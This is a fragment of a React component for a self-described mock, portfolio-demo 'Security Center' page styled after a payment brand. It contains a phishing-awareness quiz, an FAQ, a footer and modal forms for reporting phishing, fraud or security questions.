              <p className="text-base sm:text-lg text-[#6C7378] max-w-xl mx-auto leading-relaxed">
                Test your skills in spotting online threats, social engineering, and phishing attacks.
              </p>
            </section>

            {/* INTERACTIVE QUIZ WRAPPER CONTAINER */}
            <section id="quiz-card-container" className="max-w-2xl mx-auto px-4 mb-20 scroll-mt-24">
              
              {!quizFinished ? (
                /* QUIZ ACTIVE VIEW CARD */
                <div className="bg-white border border-[#E2E4E6] rounded-2xl shadow-lg border-t-1.5 overflow-hidden text-left">
                  
                  {/* Dynamic Progress Indicator bar */}
                  <div className="h-1.5 bg-[#F5F7FA] w-full">
                    <motion.div 
                      className="h-full bg-[#0079C1] rounded-r-sm"
                      animate={{ width: `${((currentQuestion + 1) / quizQuestions.length) * 100}%` }}
                      transition={{ duration: 0.3 }}
                    />
                  </div>

                  {/* Header Counter */}
                  <div className="bg-[#F5F7FA] border-b border-[#E2E4E6] px-6 py-4 flex items-center justify-between">
                    <span className="text-xs font-bold uppercase tracking-wider text-[#6C7378]">
                      Question {currentQuestion + 1} of {quizQuestions.length}
                    </span>
                    <span className="text-xs font-semibold px-2.5 py-1 bg-white rounded-md border border-[#E2E4E6] text-[#2C2E2F]">
                      Score: {quizScore}
                    </span>
                  </div>

                  {/* Core Question & Selections Body */}
                  <div className="p-6 sm:p-8">
                    <h3 className="text-lg sm:text-xl font-bold text-[#2C2E2F] leading-snug mb-6 text-left">
                      {quizQuestions[currentQuestion].question}
                    </h3>

                    {/* Option Selection buttons */}
                    <div className="flex flex-col gap-3">
                      {quizQuestions[currentQuestion].options.map((option, idx) => {
                        // Compute state styles as user interacts
                        let styleClass = "border-[#E2E4E6] hover:border-[#0079C1] hover:bg-slate-50 text-[#2C2E2F]";
                        if (quizSubmitted) {
                          if (idx === quizQuestions[currentQuestion].correctIndex) {
                            // If correct, show bright green
                            styleClass = "border-[#14BD7A] bg-[#14BD7A]/5 text-[#0b6843] font-bold";
                          } else if (idx === selectedOption) {
                            // Selected incorrect option, red
                            styleClass = "border-[#F03E3E] bg-[#F03E3E]/5 text-[#8c1c1c]";
                          } else {
                            // Generic unselected locked
                            styleClass = "border-[#E2E4E6] opacity-60 text-[#6C7378]";
                          }
                        }

                        return (
                          <button
                            key={idx}
                            disabled={quizSubmitted}
                            onClick={() => handleQuizAnswer(idx)}
                            className={`w-full text-left p-4 rounded-xl border text-sm sm:text-[0.95rem] font-medium leading-relaxed transition-all cursor-pointer ${styleClass}`}
                          >
                            {option}
                          </button>
                        );
                      })}
                    </div>

                    {/* CORRECT / INCORRECT ANALYSIS CONTAINER */}
                    <AnimatePresence>
                      {quizSubmitted && (
                        <motion.div
                          initial={{ opacity: 0, height: 0 }}
                          animate={{ opacity: 1, height: 'auto' }}
                          exit={{ opacity: 0, height: 0 }}
                          transition={{ duration: 0.3 }}
                          className={`mt-6 p-5 rounded-xl border-l-4 leading-relaxed overflow-hidden text-left ${
                            selectedOption === quizQuestions[currentQuestion].correctIndex 
                              ? 'bg-slate-50 border-[#14BD7A] text-[#2C2E2F]' 
                              : 'bg-slate-50 border-[#F03E3E] text-[#2C2E2F]'
                          }`}
                        >
                          <h4 className="font-bold text-base mb-1 object-left flex items-center gap-1.5">
                            {selectedOption === quizQuestions[currentQuestion].correctIndex ? (
                              <>
                                <span className="text-[#14BD7A]">Correct! 🌟</span>
                              </>
                            ) : (
                              <>
                                <span className="text-[#F03E3E]">Incorrect</span>
                              </>
                            )}
                          </h4>
                          <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed mb-4">
                            {quizQuestions[currentQuestion].feedback}
                          </p>
                          <button
                            onClick={handleNextQuestion}
                            className="bg-[#003087] text-white hover:bg-[#002266] font-semibold text-xs sm:text-sm px-6 py-2.5 rounded-full inline-flex items-center gap-1.5 transition-all select-none cursor-pointer"
                          >
                            <span>{currentQuestion + 1 === quizQuestions.length ? "Finish Quiz" : "Next Question"}</span>
                            <ArrowRight size={14} className="text-white" />
                          </button>
                        </motion.div>
                      )}
                    </AnimatePresence>

                  </div>
                </div>
              ) : (
                /* TROPHY SCREEN - COMPLETED WORK CARD */
                <motion.div 
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  className="bg-white border border-[#E2E4E6] rounded-2xl shadow-xl p-8 sm:p-12 text-center"
                >
                  <div className="w-20 h-20 rounded-full bg-[#fcf5e3] text-[#F0B939] flex items-center justify-center mx-auto mb-6 text-3xl animate-bounce">
                    <Trophy size={36} />
                  </div>
                  <h2 className="font-display text-2xl sm:text-3xl font-extrabold text-[#003087] mb-2">
                    You&apos;ve completed the training!
                  </h2>
                  <h3 className="text-[#0079C1] font-bold text-xl mb-4">
                    Your Final Score: {quizScore} of {quizQuestions.length}
                  </h3>
                  
                  <p className="text-sm sm:text-base text-[#6C7378] max-w-md mx-auto leading-relaxed mb-8">
                    {quizScore === quizQuestions.length ? (
                      "Perfect score! You are a genuine Pay-Pal Cyber Defense Guardian. You can confidently identify social engineering alerts, fake support mails, and transaction scams."
                    ) : quizScore >= 3 ? (
                      "Outstanding job! You have a highly solid grasp of secure payment practices. Watch out for sneaky mock alert links!"
                    ) : (
                      "A great start, but practice makes permanent. Read through our protection tips first to learn the standard safety signs!"
                    )}
                  </p>

                  <button
                    onClick={handleRestQuiz}
                    className="bg-[#003087] text-white hover:bg-[#002266] font-bold px-8 py-3.5 rounded-full text-sm inline-flex items-center gap-2 shadow-md transition-all hover:scale-102 active:scale-100 cursor-pointer"
                  >
                    <span>Restart Training Quiz</span>
                  </button>
                </motion.div>
              )}

            </section>

            {/* EDUCATIONAL FAQS Accordion */}
            <section className="max-w-3xl mx-auto px-4 py-8 border-t border-[#E2E4E6] text-left">
              <h2 className="font-display font-bold text-2xl text-center sm:text-3xl text-[#003087] mb-8">
                Frequently Asked Questions
              </h2>

              <div className="flex flex-col gap-3">
                {[
                  {
                    q: "How do I recognize a phishing email?",
                    a: "Phishing emails often create a false sense of urgency, contain generic greetings (like 'Dear User'), display bad spelling and grammar, or link to sites with suspicious domains that mimic official companies (such as 'paypol-restricted.com' instead of 'Pay-Pal.com')."
                  },
                  {
                    q: "What is Two-Factor Authentication (2FA)?",
                    a: "Two-factor authentication adds a vital extra defense level to your account. To authenticate, you must provide your main password as well as a secondary code sent directly to your phone or generated by an authenticator application."
                  },
                  {
                    q: "What should I do if my account has unauthorized charges?",
                    a: "Log in safely, update your password to a strong phrase immediately, and submit a dispute file directly under our Resolution Center in the dashboard environment. Our Buyer Protection rules look into each event in order to verify and reimburse unauthorized transfers."
                  }
                ].map((faq, index) => (
                  <div key={index} className="border border-[#E2E4E6] rounded-xl overflow-hidden bg-white shadow-xs">
                    <button
                      onClick={() => handleFaqToggle(index)}
                      className="w-full px-6 py-4.5 text-left font-bold text-sm sm:text-base text-[#003087] flex items-center justify-between gap-4 focus:outline-none cursor-pointer hover:bg-[#F5F7FA]/40 transition-colors"
                    >
                      <span>{faq.q}</span>
                      <motion.div
                        animate={{ rotate: activeFaq === index ? 45 : 0 }}
                        transition={{ duration: 0.2 }}
                      >
                        <Plus size={18} className="text-[#0079C1] shrink-0" />
                      </motion.div>
                    </button>

                    <AnimatePresence>
                      {activeFaq === index && (
                        <motion.div
                          initial={{ height: 0, opacity: 0 }}
                          animate={{ height: 'auto', opacity: 1 }}
                          exit={{ height: 0, opacity: 0 }}
                          transition={{ duration: 0.25 }}
                          className="overflow-hidden"
                        >
                          <p className="px-6 pb-5 pt-1 text-xs sm:text-sm text-[#6C7378] leading-relaxed">
                            {faq.a}
                          </p>
                        </motion.div>
                      )}
                    </AnimatePresence>
                  </div>
                ))}
              </div>
            </section>

          </motion.div>
        )}

      </main>

      {/* FOOTER SECTION */}
      <footer className="bg-white border-t border-[#E2E4E6] py-12 text-[#2C2E2F] select-none text-left">
        <div className="max-w-5xl mx-auto px-4 md:px-6">
          
          {/* Logo brand */}
          <div className="font-display font-extrabold italic text-xl tracking-tight text-[#003087] mb-6">
            Pay<span className="text-[#0079C1]">-Pol</span>
          </div>

          {/* Core Footer Link lists */}
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-6">
            <ul className="flex flex-wrap gap-x-5 gap-y-2 text-xs sm:text-sm font-bold text-[#003087]">
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Help</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Contact</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Fees</a></li>
              <li><a href="#" onClick={(e) => { e.preventDefault(); handleTabChange('security-center'); }} className="hover:text-[#0079C1] hover:underline">Security Center</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Privacy Center</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Shop</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Apps</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Enterprise</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Partners</a></li>
            </ul>
            
            <div className="flex items-center gap-2 text-xs font-bold text-[#6C7378] select-none">
              <Globe size={14} className="text-[#6C7378]" />
              <span>United States</span>
            </div>
          </div>

          <hr className="border-[#E2E4E6] my-6" />

          {/* Secondary links & address block */}
          <div className="flex flex-col gap-6 text-xs text-[#6C7378]">
            <ul className="flex flex-wrap gap-x-5 gap-y-2 font-bold text-[#003087]">
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">About</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Newsroom</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Jobs</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Investor Relations</a></li>
              <li><a href="#" className="hover:text-[#0079C1] hover:underline">Government Relations</a></li>
            </ul>

            <div className="flex flex-col gap-2">
              <ul className="flex flex-wrap gap-x-4 gap-y-1.5 font-semibold text-[#6C7378]">
                <li><span>&copy; 1999–2026</span></li>
                <li><a href="#" className="hover:text-[#0079C1] hover:underline">Accessibility</a></li>
                <li><a href="#" className="hover:text-[#0079C1] hover:underline">Privacy Statement</a></li>
                <li><a href="#" className="hover:text-[#0079C1] hover:underline">Cookies</a></li>
                <li><a href="#" className="hover:text-[#0079C1] hover:underline">Legal</a></li>
                <li><a href="#" className="hover:text-[#0079C1] hover:underline">Licenses</a></li>
              </ul>
              <p className="text-[11px] text-[#6C7378]/80 font-medium">
                Pay-Pal is located at 2211 N 1st St, San Jose, CA 95131. Simulated mock application for portfolio demonstration.
              </p>
            </div>
          </div>

        </div>
      </footer>

      {/* --- FLOATING TOAST NOTIFICATION --- */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: 50, x: '-50%' }}
            animate={{ opacity: 1, y: 0, x: '-50%' }}
            exit={{ opacity: 0, y: 50, x: '-50%' }}
            className="fixed bottom-8 left-1/2 -translate-x-1/2 bg-[#14BD7A] text-white px-6 py-4 rounded-full shadow-lg z-9999 flex items-center gap-3.5"
          >
            <CheckCircle2 size={18} className="text-white shrink-0" />
            <span className="text-xs sm:text-sm font-bold tracking-tight">{toastMessage}</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* --- MODAL 1: REPORT PHISHING OR SPOOFING --- */}
      <AnimatePresence>
        {showPhishingModal && (
          <div className="fixed inset-0 bg-[#001432]/60 backdrop-blur-xs flex items-center justify-center p-4 z-999">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              transition={{ type: 'spring', damping: 25, stiffness: 350 }}
              className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden text-left border border-[#E2E4E6]"
            >
              {/* Modal header */}
              <div className="bg-[#F5F7FA] px-6 py-4 border-b border-[#E2E4E6] flex items-center justify-between">
                <h3 className="font-display font-bold text-lg text-[#003087]">Report Suspicious Message</h3>
                <button 
                  onClick={() => setShowPhishingModal(false)}
                  className="p-1 rounded-full text-[#6C7378] hover:text-[#2C2E2F] hover:bg-slate-200 transition-colors cursor-pointer"
                >
                  <X size={18} />
                </button>
              </div>

              {/* Modal body */}
              <form onSubmit={handlePhishingSubmit} className="p-6 flex flex-col gap-4">
                <p className="text-xs text-[#6C7378] leading-relaxed">
                  Received a suspicious email, text message, or website link mimicking Pay-Pal? Report it here to help us investigate.
                </p>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="phishingSender" className="text-xs font-bold text-[#2C2E2F]">
                    Sender Email or Phone Number
                  </label>
                  <input
                    type="text"
                    id="phishingSender"
                    required
                    placeholder="e.g., alert@paypol-limit.com"
                    value={phishingForm.sender}
                    onChange={(e) => setPhishingForm({ ...phishingForm, sender: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                  />
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="phishingUrl" className="text-xs font-bold text-[#2C2E2F]">
                    Suspicious URL / Link (Optional)
                  </label>
                  <input
                    type="url"
                    id="phishingUrl"
                    placeholder="e.g., http://verify-identity-paypol.com"
                    value={phishingForm.url}
                    onChange={(e) => setPhishingForm({ ...phishingForm, url: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                  />
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="phishingDetails" className="text-xs font-bold text-[#2C2E2F]">
                    Additional Details (Optional)
                  </label>
                  <textarea
                    id="phishingDetails"
                    rows={3}
                    placeholder="Paste the subject line, email body text, or other indicators here..."
                    value={phishingForm.details}
                    onChange={(e) => setPhishingForm({ ...phishingForm, details: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-medium focus:outline-none focus:border-[#0079C1] transition-all resize-none"
                  />
                </div>

                {/* Actions button */}
                <div className="flex items-center justify-end gap-3 mt-4">
                  <button
                    type="button"
                    onClick={() => setShowPhishingModal(false)}
                    className="px-5 py-2.5 rounded-full border border-[#E2E4E6] text-xs sm:text-sm font-semibold hover:bg-[#F5F7FA] text-[#6C7378] cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="bg-[#003087] text-white hover:bg-[#002266] font-bold px-6 py-2.5 rounded-full text-xs sm:text-sm shadow-sm hover:scale-[1.01] transition-transform cursor-pointer"
                  >
                    Submit Report
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* --- MODAL 2: REPORT FRAUD OR UNUSUAL TRANSACTION --- */}
      <AnimatePresence>
        {showFraudModal && (
          <div className="fixed inset-0 bg-[#001432]/60 backdrop-blur-xs flex items-center justify-center p-4 z-999">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              transition={{ type: 'spring', damping: 25, stiffness: 350 }}
              className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden text-left border border-[#E2E4E6]"
            >
              {/* Modal header */}
              <div className="bg-[#F5F7FA] px-6 py-4 border-b border-[#E2E4E6] flex items-center justify-between">
                <h3 className="font-display font-bold text-lg text-[#003087]">Report Fraudulent Activity</h3>
                <button 
                  onClick={() => setShowFraudModal(false)}
                  className="p-1 rounded-full text-[#6C7378] hover:text-[#2C2E2F] hover:bg-slate-200 transition-colors cursor-pointer"
                >
                  <X size={18} />
                </button>
              </div>

              {/* Modal body */}
              <form onSubmit={handleFraudSubmit} className="p-6 flex flex-col gap-4">
                <p className="text-xs text-[#6C7378] leading-relaxed">
                  Notice an unusual charge you didn&apos;t authorize or dynamic modifications made to your passwords/settings? Let us verify immediately.
                </p>

                <div className="grid grid-cols-2 gap-4">
                  <div className="flex flex-col gap-1.5 text-left">
                    <label htmlFor="fraudDate" className="text-xs font-bold text-[#2C2E2F]">
                      Approximate Date & Time
                    </label>
                    <input
                      type="datetime-local"
                      id="fraudDate"
                      required
                      value={fraudForm.date}
                      onChange={(e) => setFraudForm({ ...fraudForm, date: e.target.value })}
                      className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                    />
                  </div>

                  <div className="flex flex-col gap-1.5 text-left">
                    <label htmlFor="fraudAmount" className="text-xs font-bold text-[#2C2E2F]">
                      Amount (if transaction)
                    </label>
                    <input
                      type="text"
                      id="fraudAmount"
                      placeholder="e.g., $150.00"
                      value={fraudForm.amount}
                      onChange={(e) => setFraudForm({ ...fraudForm, amount: e.target.value })}
                      className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                    />
                  </div>
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="fraudType" className="text-xs font-bold text-[#2C2E2F]">
                    Type of Incident Issue
                  </label>
                  <select
                    id="fraudType"
                    required
                    value={fraudForm.type}
                    onChange={(e) => setFraudForm({ ...fraudForm, type: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                  >
                    <option value="" disabled>Select an option</option>
                    <option value="unauthorized">Unauthorised Transaction Alert</option>
                    <option value="compromise">Password or recovery email changed secretly</option>
                    <option value="scam">Item was purchased but seller is unresponsive</option>
                    <option value="other">Other unusual behavioral activities</option>
                  </select>
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="fraudDetails" className="text-xs font-bold text-[#2C2E2F]">
                    Explain the situation
                  </label>
                  <textarea
                    id="fraudDetails"
                    required
                    rows={3}
                    placeholder="Provide details to assist us in performing quick security audits..."
                    value={fraudForm.details}
                    onChange={(e) => setFraudForm({ ...fraudForm, details: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-medium focus:outline-none focus:border-[#0079C1] transition-all resize-none"
                  />
                </div>

                {/* Actions button */}
                <div className="flex items-center justify-end gap-3 mt-4">
                  <button
                    type="button"
                    onClick={() => setShowFraudModal(false)}
                    className="px-5 py-2.5 rounded-full border border-[#E2E4E6] text-xs sm:text-sm font-semibold hover:bg-[#F5F7FA] text-[#6C7378] cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="bg-[#003087] text-white hover:bg-[#002266] font-bold px-6 py-2.5 rounded-full text-xs sm:text-sm shadow-sm hover:scale-[1.01] transition-transform cursor-pointer"
                  >
                    Report Issue
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* --- MODAL 3: GET HELP WITH SECURITY (CONTACT FORM) --- */}
      <AnimatePresence>
        {showContactModal && (
          <div className="fixed inset-0 bg-[#001432]/60 backdrop-blur-xs flex items-center justify-center p-4 z-999">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              transition={{ type: 'spring', damping: 25, stiffness: 350 }}
              className="bg-white rounded-2xl shadow-2xl w-full max-w-lg overflow-hidden text-left border border-[#E2E4E6]"
            >
              {/* Modal header */}
              <div className="bg-[#F5F7FA] px-6 py-4 border-b border-[#E2E4E6] flex items-center justify-between">
                <h3 className="font-display font-bold text-lg text-[#003087]">Get help with security</h3>
                <button 
                  onClick={() => setShowContactModal(false)}
                  className="p-1 rounded-full text-[#6C7378] hover:text-[#2C2E2F] hover:bg-slate-200 transition-colors cursor-pointer"
                >
                  <X size={18} />
                </button>
              </div>

              {/* Modal body */}
              <form onSubmit={handleContactSubmit} className="p-6 flex flex-col gap-4">
                <p className="text-xs text-[#6C7378] leading-relaxed">
                  Connecting you directly to our global Pay-Pal Information Security support desks. Submit your query, name, and email details below.
                </p>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="contactName" className="text-xs font-bold text-[#2C2E2F]">
                    Your Name
                  </label>
                  <input
                    type="text"
                    id="contactName"
                    required
                    placeholder="e.g. John Doe"
                    value={contactForm.name}
                    onChange={(e) => setContactForm({ ...contactForm, name: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                  />
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="contactEmail" className="text-xs font-bold text-[#2C2E2F]">
                    Your Email Address
                  </label>
                  <input
                    type="email"
                    id="contactEmail"
                    required
                    placeholder="e.g. john@example.com"
                    value={contactForm.email}
                    onChange={(e) => setContactForm({ ...contactForm, email: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-semibold focus:outline-none focus:border-[#0079C1] transition-all"
                  />
                </div>

                <div className="flex flex-col gap-1.5 text-left">
                  <label htmlFor="contactMsg" className="text-xs font-bold text-[#2C2E2F]">
                    Message / Question
                  </label>
                  <textarea
                    id="contactMsg"
                    required
                    rows={4}
                    placeholder="How can our specialised anti-fraud specialists assist you today?"
                    value={contactForm.message}
                    onChange={(e) => setContactForm({ ...contactForm, message: e.target.value })}
                    className="w-full bg-white border-1.5 border-[#E2E4E6] rounded-lg p-2.5 text-sm font-medium focus:outline-none focus:border-[#0079C1] transition-all resize-none"
                  />
                </div>

                {/* Actions button */}
                <div className="flex items-center justify-end gap-3 mt-4">
                  <button
                    type="button"
                    onClick={() => setShowContactModal(false)}
                    className="px-5 py-2.5 rounded-full border border-[#E2E4E6] text-xs sm:text-sm font-semibold hover:bg-[#F5F7FA] text-[#6C7378] cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="bg-[#003087] text-white hover:bg-[#002266] font-bold px-6 py-2.5 rounded-full text-xs sm:text-sm shadow-sm hover:scale-[1.01] transition-transform cursor-pointer"
                  >
                    Send Message
                  </button>
                </div>
              </form>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

    </div>
  );
}
